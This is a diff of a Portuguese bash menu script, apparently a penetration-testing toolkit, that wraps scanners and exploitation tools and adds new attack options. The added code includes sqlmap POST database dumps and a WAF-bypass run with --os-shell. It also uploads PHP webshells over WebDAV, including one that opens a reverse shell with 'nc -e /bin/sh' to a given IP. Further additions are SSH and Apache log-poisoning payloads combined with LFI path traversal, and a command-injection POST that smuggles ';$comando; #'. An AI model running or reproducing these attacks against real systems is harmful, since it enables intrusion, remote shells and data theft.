@@ -1,22 +1,38 @@
 #!/bin/bash
 ################################################################################
-##Variaveis 
+## Setar as Variaveis  de acordo com suas tools e wordlist !!!!!!
 opnmap1="-sS -sV -sC -A -Pn"
 portas="-p-"
-#portaalvo=""
-#ipalvo=""
 opgobuster1="php,txt,html,sh,cgi,js,css,py,bak,pdf,doc,docx,xml"
 arquivosbrute="/usr/share/wordlists/dirb/big.txt"
 wordlista="/usr/share/wordlists/rockyou.txt"
 token2=""
-listadominios1="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
-dirb="/home/bl4dsc4n/Downloads/dirsearch-master/dirsearch.py"
+listadominios1="/home/bl4dsc4n//Dowloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+dirb="/home/bl4dsc4n/Downloads/dirsearch/dirsearch.py"
 wordlistLFI2="/home/bl4dsc4n/Downloads/wordlist-lfi.txt"
-loncrack1="/home/bl4dsc4n/Downloads/loncrack-master/wl.txt"
 listaAlha="/usr/share/crunch/charset.lst"
 communities1="/usr/share/cisco-torch/community.txt"
 share="/home/bl4dsc4n/Downloads/dirsearch-master/shares.txt"
-
+diretorios="/home/bl4dsc4n//Downloads/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt"
+arquivos2="/home/bl4dsc4n//Downloads/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt"
+parampp="/home/bl4dsc4n//Downloads/ParamSpider/parampp.py"
+xsstrike="/home/bl4dsc4n/Downloads/XSStrike/xsstrike.py"
+commix="/home/bl4dsc4n/Downloads/commix/commix.py"
+templetes="/home/bl4dsc4n/nuclei-templates/"
+#################################################################################
+#   Tools necessarias --- Sistema operacional testado: Kali Linux               #
+#################################################################################
+# https://github.com/s0md3v/XSStrike
+# https://github.com/projectdiscovery/nuclei
+# https://github.com/projectdiscovery/nuclei-templates
+# https://github.com/bp0lr/gauplus
+# https://github.com/tomnomnom/qsreplace
+# https://github.com/devanshbatham/ParamSpider
+# https://github.com/commixproject/commix
+# https://github.com/danielmiessler/SecLists
+# https://github.com/maurosoria/dirsearch
+# https://github.com/OJ/gobuster
+#################################################################################
 #datahoje=$(date '+%d/%m/%Y - %T')
 #cidade="Belém-Pará"
 #################################################################################
@@ -28,28 +44,30 @@ clear
 while :
 do
     # Imprimindo as opções do menu
-    echo
-    echo "Inf Gathering # Enumeração # Scan # Exploração"
-    echo -e "\e[36;1mDesenvolvido por: Pentest Jr # Carlos Tuma # Bl4dsc4n\e[0m" 
-    echo -e "\e[31;1mLivre uso e modificação, mantenha o crédito em comentário\e[0m" "\e[32;1;5mSw1tchbl4d3 Ver 1.0.3a\e[0m"           
-    echo "----------------------------------------------------------------------------------------------------"
-    echo '| 1 - Scan Serviços & Vuln Nmap 11- Brute Force de SubDomain    21- Criando Reverse Shell MSFvenom  |'
-    echo '| 2 - Scan Arquivos Gobuster    12- Baixar arquivos do ftp      22- Dirsearch                       |'
-    echo '| 3 - Scan WordPress Wpscan     13- Transferencia de Zona       23- PortScan                        |'
-    echo '| 4 - Scan SQLMAP               14- Onesixtyone                 24- Analisando Metodos HTTP         |'
-    echo '| 5 - Pesquisa DNS              15- Enum4linux                  25- Modulo WEBDAV inj. shell.php    |'
-    echo '| 6 - Scan joomla joomscan      16- Comandos do Sistema         26- Esteganografia                  |'
-    echo '| 7 - Clonando Dominio          17- Exploração LFI linux        27- Brute Force                     |'
-    echo '| 8 - Recon WhatWeb Tecnologias 18- Convertendo Bases           28- Infecção de Log SSH - LFI linux |'
-    echo '| 9 - Identificar WAF           19- PingSweep Scan              29- Google Hack                     |'
-    echo '| 10 - Sslscan                  20- Enumerando Arq. SMB netbios 30- Gerando Wordlista Personalizada |'
-    echo '|                                                                                                   |'
-    echo '| 0 - Sair                                                                                          |'
-    echo "----------------------------------------------------------------------------------------------------"
+    echo -e "\e[36;1mDesenvolvido por: Pentester # Carlos Tuma # Bl4dsc4n\e[0m"
+    echo -e "\e[31;1mLivre uso e modificação, mantenha o crédito em comentário\e[0m" "\e[32;1;5mSw1tchbl4d3\e[0m"         
+    echo '------------------------------------------------------------------------------------------------------------------------------------'
+    echo '| 1 - Scan Serviços & Vuln Nmap  12- Baixar arquivos do ftp 	        23- PortScan                       34) commix POST         |     ▀▀░░░░░░░░░░░░░▀▀' 
+    echo '| 2 - Scan Arquivos Gobuster     13- Transferencia de Zona            24- Analisando Metodos HTTP        35) command Injection Post|   ▀░░░░░░░░░░░░░░░░░░░▀'
+    echo '| 3 - Scan WordPress Wpscan      14- Onesixtyone                      25- Modulo WEBDAV inj. shell.php                             |   │░░░░░░░░░░░░░░░░░░░│'
+    echo '| 4 - Scan SQLMAP                15- Enum4linux                       26- Esteganografia                                           |  ▐│░░Sw1tchbl4d3 v2.0░│▐' 
+    echo '| 5 - Pesquisa DNS               16- Comandos do Sistema              27- Brute Force                                              |  ░└┐░░░░░Bl4dsc4n░░░░┌┘░'
+    echo '| 6 - Scan joomla joomscan       17- Exploração LFI linux             28- Infecção de Log SSH - LFI linux                          |  ░░└┐░░░░░░░░░░░░░░░┌┘░░'
+    echo '| 7 - Clonando Dominio           18- Convertendo Bases                29- Google Hack                                              |  ░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░'
+    echo '| 8 - Recon WhatWeb Tecnologias  19- PingSweep Scan                   30- Gerando Wordlista Personalizada                          |   ░│██████▌░░░▐██████│░'
+    echo '| 9 - Identificar WAF            20- Enumerando Arq. SMB netbios      31) RECON - ATACK - BugHunter                                |   ░│▐███ .░░▄░░. ███▌│░'
+    echo '| 10 - Sslscan                   21- Criando Reverse Shell MSFvenom   32) XSStrike                                                 |   ─┘░░░░░░░▐█▌░░░░░░░└─'
+    echo '| 11- Brute Force de SubDomain   22- Dirsearch                        33) ParamSpider                                              |   ░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░'
+    echo '|                                                                                                                      0 - Sair    |    ▄─┘██▌░░░░░░░▐██└─▄'
+    echo '-----------------------------------------------------------------------------------------------------------------------------------      ░░▐█─┬┬┬┬┬┬┬─█▌░░'
+    echo '                                                                                                                                         ░░░▀┬┼┼┼┼┼┼┼┬▀░░░'
+    echo '                                                                                                                                         ▄░░░└┴┴┴┴┴┴┴┘░░░▄'
+    echo '                                                                                                                                           ▄░░░░░░░░░░░▄  '
+    echo '                                                                                                                                              ▄▄▄▄▄▄▄'
     #echo "$cidade, $datahoje" 
-    echo
+    #echo
     # '-p' Exibe a mensagem 'Opção:' '-n2' Lê dois caracteres e armazena em 'OPCAO'.
-
+    
     read -n2 -p 'Opção: ' OPCAO 
 
     # Insere uma nova linha
@@ -67,8 +85,7 @@ do
             echo "6) Enumerando shares NetBios"
             echo "7) Scan Mysql Vuln"
              
-
-	    read -n1 -p 'Opção: ' resp
+            read -n1 -p 'Opção: ' resp
             echo
             
 	    case $resp in            
@@ -149,7 +166,7 @@ do
         2)  # Gobuster 
             echo "1) DNS subdomain bruteforcing"
             echo "2) Directory/file brutceforcing"
-          
+                 
             read -n1 -p 'Opção: ' resp0
             echo
             
@@ -246,11 +263,17 @@ do
 ############################################## sqlmap ###############################################################
 	4)  # sql DATABASE / sqlmap TABLES / sqlmap COLUNA / sqlmap DUMP 
             
-	    echo "1) Scan Databases SQLMAP"
-	    echo "2) Scan Tabelas SQLMAP"
-            echo "3) Scan Colunas SQLMAP"	
-	    echo "4) DUMP SQLMAP"
-	    read -n1 -p 'Opção: ' resp1
+	    echo "1) GET - Scan Databases SQLMAP"
+	    echo "2) GET - Scan Tabelas SQLMAP"
+            echo "3) GET - Scan Colunas SQLMAP"	
+	    echo "4) GET - DUMP SQLMAP"
+	    echo "5) POST - SQLMAP Scan Databases"
+	    echo "6) POST - SQLMAP Scan Tabelas"
+            echo "7) POST - SQLMAP Scan Colunas"	
+	    echo "8) POST - SQLMAP DUMP"
+	    echo "9) TAMPER BY PASS WAF"
+
+            read -n1 -p 'Opção: ' resp1
             echo
 	    case $resp1 in
 	    
@@ -290,8 +313,59 @@ do
                          echo "Digite a coluna:"
                          read coluna
                          sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 -T $tabela -C $coluna --dump
-       
-	    esac
+            ;;
+                         
+            "5") # POST SQLMAP
+            		 echo "Digite o campo POST ex: http://site/login.php"
+            		 read campo
+            		 echo "Digite as opcoes do POST ex: user=user&login=aa"
+            		 read opcoes
+            		 sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent --dbs        
+            ;;
+
+	    "6")  # POST SQLMAP Scan Tabelas
+			 echo "Digite o campo POST ex: http://site/login.php"
+			 read url
+            		 echo "Digite as opcoes do POST ex: user=user&login=aa"
+            		 read opcoes
+			 echo "Digite a nome da database"
+            		 read database1
+                         sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent -D $database1 --tables
+            ;;
+
+	    "7")  # POST SQLMAP Scan Colunas
+           
+			 echo "Digite o campo POST ex: http://site/login.php"
+       			 read url
+                         echo "Digite as opcoes do POST ex: user=user&login=aa"
+                         read opcoes
+			 echo "Digite a nome da database"
+            		 read database1
+                         echo "Digite a tabela:"
+                         read tabela
+                         sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent -D $database1 -T $tabela --columns
+            ;;
+
+	    "8")  # POST SQLMAP DUMP
+                         echo "Digite o campo POST ex: http://site/login.php"
+                         read url
+	                 echo "Digite as opcoes do POST ex: user=user&login=aa"
+                         read opcoes
+                         echo "Digite a nome da database"
+            		 read database1
+                         echo "Digite a tabela:"
+                         read tabela
+                         echo "Digite a coluna:"
+                         read coluna
+                         sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent -D $database1 -T $tabela -C $coluna --dump  
+            ;;
+                         
+            "9")  # TAMPER BY PASS WAF
+                         echo "Digite o campo POST ex: http://site/login.php"
+                         read url
+	                 sqlmap -u "$url" --risk=3 --level=5 --random-agent --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --batch --os-shell --dbs 
+	                 
+	                 esac
 	    ;;
 
 ################################################### Pesquisa DNS ##################################################
@@ -344,10 +418,24 @@ do
 	    ;;
 
 ################################################### joomscan ######################################################
-	6)  # joomscan 
+	6)  # joomscan - sudo apt install joomscan
+            echo "1) Instalar joomscan"
+            echo "2) Scan"
+            
+            read -n1 -p 'Opção: ' resp11
+            echo
+	    case $resp11 in
+	    
+            "1") # Instalar joomscan
+                    apt update
+            	    apt install joomscan -y
+            ;;
+                                   
+            "2") # Scan joomscan
             echo "Digite o Dominio alvo:"
             read ip
             joomscan -ec -r -u $ip
+	    esac
 	    ;;
 
 #################################################### clonando dominio ##############################################
@@ -460,7 +548,7 @@ do
             echo "7) Converter Decimal"
             echo "8) Base64 Decode de texto"
             echo "9) Converter texto em base64"
-
+            
             read -n1 -p 'Opção: ' resp3
             echo
 	    case $resp3 in
@@ -512,14 +600,18 @@ do
 	    "8")  # 
             		 echo "Digite o texto para converter:"
             		 read texto
-			 echo "$texto" | base64			              
+			 echo "$texto" | base64
+	    ;;
+	    "9")  # 
+            		 echo "Digite o texto Ascii converter Decimal:"
+            		 read texto
+			 echo $texto | perl -lne 'print join " ", map { ord $_ } split //' | awk '{print $1","$2","$3","$4","$5","$6","$7","$8","$9","$10","$11","$12","$13","$14","$15}'
 	    esac
 	    ;;
 
 
 ############################################ PingSweep ScanRede ################################################################
         19)  # PingSweep Scan /24
-
             echo "Digite o IP da rede Ex: 192.168.1.0"
             read ipI
             echo $ipI > ipI.txt
@@ -535,7 +627,6 @@ do
 	    echo "1) Enumerando compar. - null session - smbclient"
 	    echo "2) Brute de compartilhamentos - null session"
             echo "3) Scan NetBios - nbtscan"	
-		
             read -n1 -p 'Opção: ' resp3
             echo
 	    case $resp3 in
@@ -564,7 +655,6 @@ do
             		echo "Digite a Rede:"
             		read rede
 	    		nbtscan $rede
-  
             esac
             ;;
 
@@ -589,8 +679,7 @@ do
             echo "16) Reverse TCP macOS x86"
 	    read -n2 -p 'Opção: ' resp4
             echo
-            
-	    case $resp4 in
+            case $resp4 in
 	    "1") ## Reverse Tcp x86
 			echo "Digite o IP Reverso"
 			read ip
@@ -708,7 +797,6 @@ do
 			echo "Digite a Porta Reversa"
                         read porta
                         msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$porta -f macho > shell.macho
-            
             esac
             ;;
 
@@ -716,6 +804,7 @@ do
          22)  # dirsearch 
             echo "1) Procura normal"
             echo "2) Procura Recursiva"
+            echo "3) Procura de Arquivos or Pastas"
             read -n2 -p 'Opção: ' resp8
             echo
             
@@ -736,16 +825,16 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute 
+		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute -t 80
 		                   else
-		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute -x $status
+		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute -x $status -t 80
 		                   fi
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-                                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3 
+                                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3 -t 80
 		                   else
-     		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3  -x $status     
+     		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3 -x $status -t 80     
 		                   fi
 		                        
 		             fi      
@@ -754,16 +843,16 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute  
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute -t 80 
 		                   else
-		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute -x $status
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute -x $status -t 80
 		                   fi
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute  
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute -t 80 
 		                   else
-		                        python3 $dirb -f -e $opgobuster -u $ip -w $wordlista3 -x $status
+		                        python3 $dirb -f -e $opgobuster -u $ip -w $wordlista3 -x $status -t 80
 		                   fi     
 		             fi    
                        fi
@@ -786,16 +875,16 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -t 80
 		                   else
-		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -x $status
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -x $status -t 80
 		                   fi
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-  	                                python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 
+  	                                python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 -t 80
   	                           else
-		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 -x $status
+		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 -x $status -t 80
 		                   fi     
 		             fi      
 	               else
@@ -803,19 +892,33 @@ do
   	                     then
   	                           if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster 
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster -t 80
 		                   else
-		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster -x $status
+		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster -x $status -t 80
 		                   fi     
 		             else
 		                   if [ "$status" == "" ]
   	                           then
-		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster 
+		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster -t 80
 		                   else
-		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster -x $status
+		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster -x $status -t 80
 		                   fi     
 		             fi    
                        fi 
+            ;;
+  
+            "3") ## Procura de Arquivos
+                       echo "Digite o IP/pasta ou Dominio/pasta alvo:"
+                       read ip
+                       echo "Digite os status para excluir Ex: 403,500"
+            	       read status
+                       
+                       if [ "$status" == "" ]
+  	               then
+  	                     python3 $dirb -u $ip -w $arquivos2 -t 80
+	               else
+                             python3 $dirb -u $ip -w $arquivos2 -t 80
+		       fi            
             esac	    
             ;; 
 
@@ -849,7 +952,6 @@ do
 	    echo "2) Shell Reverse com nc"
 	    echo "3) Teste automatizado Davtest"
 	    echo "4) Conectar webdav - cadaver"
-          	  
             read -n1 -p 'Opção: ' resp5
             echo
 	    case $resp5 in
@@ -861,7 +963,7 @@ do
                       echo "Digite o Comando (ex: id)"
              	      read comando
 		      echo
-                      curl -X PUT -d "<?php system('$comando');?>" $ip/webshell.php
+                      curl -X PUT -d "<?php%20system('$comando');?>" $ip/webshell.php
                       curl -s -X GET $ip/webshell.php | egrep -v "<"
             ;;
 
@@ -875,9 +977,9 @@ do
                       echo "Digite a Porta Reversa"
                       read porta
                       echo
-                      curl -s -X PUT -d "<?php system('nc -e /bin/sh $ipreverso $porta');?>" http://$ip/webshell.php
+                      curl -s -X PUT -d "<?php%20system('nc -e /bin/sh $ipreverso $porta');?>" http://$ip/webshell.php
                       curl -s -X GET http://$ip/webshell.php
-                       
+                     # curl -v http://172.16.1.10/webdav/ --upload-file shell.php   
             ;;
             
             "3") # Testar WebDav - davtest  
@@ -892,8 +994,14 @@ do
                       echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
                       read ip
                       cadaver http://$ip/
+            ;;
               
-                     
+            "5") # WebShell Reversa PHP  - ShellScript  
+                         
+                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
+                      read ip
+                      curl -X PUT http://$ip/ --upload-file webshell2.php
+                      curl -X GET http://$ip/webshell2.php              
                             
             esac
 	    ;;
@@ -939,7 +1047,6 @@ do
             echo "5) Brute de Hash Linux etc/shadow"
 	    echo "6) Brute id_rsa SSH"
 	    echo "7) Brute de Hash Linux"
-          
             read -n1 -p 'Opção: ' resp6
             echo
 	    case $resp6 in
@@ -1078,8 +1185,9 @@ do
 ###################################################################################################################
        28)  # Infecção de Log SSH - LFI linux 
            echo "1) Infectando Log SSH - LFI"
-           echo "2) Explorando Infec Log SSH - LFI"
-                   
+           echo "2) Infectando Log APACHE2 - LFI"
+           echo "3) Explorando Infec Log SSH - LFI"
+           echo "4) Explorando Infec Log APACHE2 - LFI"
            read -n1 -p 'Opção: ' resp12
            echo
 	   case $resp12 in
@@ -1088,11 +1196,22 @@ do
 		    echo "Digite o IP do Alvo"
                     read ip
                     echo "Aguarde..erre a senha 3 vezes.."
-                    echo teste |  ssh '<?php system($_GET["sw1tchbl4d3"]); ?>'@$ip
+                    echo teste |  ssh '<?php%20system($_GET["sw1tchbl4d3"]);%20?>'@$ip
 	   ;;
 	   
 	   
-	   "2") # Explorando Infec Log SSH - LFI
+	   "2") # Infectando Log Apache2 - LFI
+		    echo "Digite o IP do Alvo"
+                    read ip
+                    echo "Digite a porta"
+                    read porta
+                    echo "Espere conectar !! copie e cole o codigo"
+                    echo "<?php%20system($_GET['sw1tchbl4d3']);%20?>" 
+                    nc -v $ip $porta -C
+                    
+	   ;;
+
+	   "3") # Explorando Infec Log SSH - LFI
 
 		    echo "Digite o local com LFI ex: domino/arquivo.php?="
 		    read local2
@@ -1104,7 +1223,20 @@ do
 		    echo "Comando executado..."
                     echo "-----------------------------------------------------------" 
                     echo "$resposta" 
-                     
+                    
+           ;;
+           "4") # Explorando Infec Log Apache - LFI
+
+		    echo "Digite o local com LFI ex: domino/arquivo.php?="
+		    read local2
+                    echo "Digite o comando Ex: ls%20-la"
+		    read comando
+                    echo "Aguarde..."
+                    curl -s -X GET "$local2../../../../../../../var/log/apache2/access.log&sw1tchbl4d3=$comando" | egrep -v "172|<"
+                    echo "Comando executado..."
+                    echo "-----------------------------------------------------------" 
+                    
+           
            esac
            ;;
 
@@ -1142,7 +1274,6 @@ do
             echo "6) Gerador de Senhas"
             echo "7) Mutação de Worlists"
             echo "8) Gerar wordlist por Dominio"
-
             read -n1 -p 'Opção: ' resp7
             echo
 	    case $resp7 in
@@ -1171,7 +1302,7 @@ do
             "3") # Gerando Letras Minúsculas , Maiúsculas e Números
             	    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
                     read quantidadecara
-                    echo "Digite l=minuscula u=maiúscula ex: u"2
+                    echo "Digite l=minuscula u=maiúscula ex: u"
                     read mm
 		    echo "Digite um nome para o Arquivo"
                     read nomearquivo
@@ -1236,6 +1367,83 @@ do
 
             esac                           
             ;;
+###################################################################################################################
+       31)  # RECON - ATACK - BugHunter 
+            echo "Digite o dominio"
+            read dominio
+            mkdir $dominio
+            cd $dominio
+            echo "Procurando Dominios e Subdominios"
+            subfinder -d $dominio | xargs -I@ findomain -t @ -q --pscan | tee -a domainTakeOver 
+            ex -s -c '%s/ //e|%s/]//e|x' domainTakeOver
+            awk -F "," '{print $1}' domainTakeOver > dominios 
+            awk -F "[" '{print $2}' domainTakeOver > portas
+            echo "gauplus";awk '{print $1}' dominios | gauplus --random-agent -t 25 -b ttf,woff,svg,png,jpg | tee -a links
+            echo "qsreplace";cat links | qsreplace | tee -a links2 
+            echo "procurando js e json";awk '/\.js|\.json/ {print $1}' links2 > json_files 
+            echo "procurando paramentos";awk '/\=/ {print $1}' links2 | tee -a ssrf sqli xss lfi idor redirect rce
+            nuclei -ut
+            cat links2 | egrep "\=|\?|\/" | nuclei -c 100 -t $templetes -severity critical,medium,high,low | tee -a nucleitestando
+	    ;;
+###################################################################################################################
+            32) #  XSStrike
+            echo "1) XSS Teste de Paramentro"
+	    echo "2) XSS Localizar Parametro"
+            echo "3) Self-XSS"
+            read -n1 -p 'Opção: ' resp26
+            echo
+	    case $resp26 in
+	    
+	    "1") # XSS Teste de Paramentro  
+           	     echo "Digite o caminho do parametro ex: http://turismo/procurar.php/?busca="
+                     read xssp
+		     python3 $xsstrike -u "$xssp"
+                                       
+            ;;
+
+            "2") # XSS Localizar Parametro 
+            	     echo "Digite o caminho ex: http://turismo/procurar.php"
+                     read xsslp
+                     python3 $xsstrike -u "$xsslp" --params
+                                         
+            ;;
+
+            "3") # Self-XSS 
+                     echo "Digite o caminho ex: http://turismo/procurar.php/"
+                     read sxss
+                     python3 $xsstrike -u "$sxss" --path
+            	     
+            esac
+	    ;;
+###################################################################################################################
+            33) #  ParamSpider
+            echo "Digite o Dominio ex:http://site.com.br"
+            read dominio
+            python3 $parampp -u "$dominio"
+            
+	    ;;
+
+
+###################################################################################################################
+            34) #  commix POST
+            echo "Digite o local do CMI ex: http://site.com.br/whois/"
+            read dominio
+            echo "Digite o parametro Ex: site="
+            read parametro
+            python3 $commix --url $dominio --data="$parametro" security=low
+            
+	    ;;
+
+###################################################################################################################
+            35) #  command Injection POST
+            echo "Digite o local do CMI ex: http://site.com.br/whois/"
+            read dominio
+            echo "Digite o parametro Ex: site="
+            read parametro
+            echo "Digite o comando"
+            read comando
+            curl -s -X POST -d "$parametro;$comando; #" $dominio | grep -v "<"
+	    ;;
 
 
 ###################################################################################################################
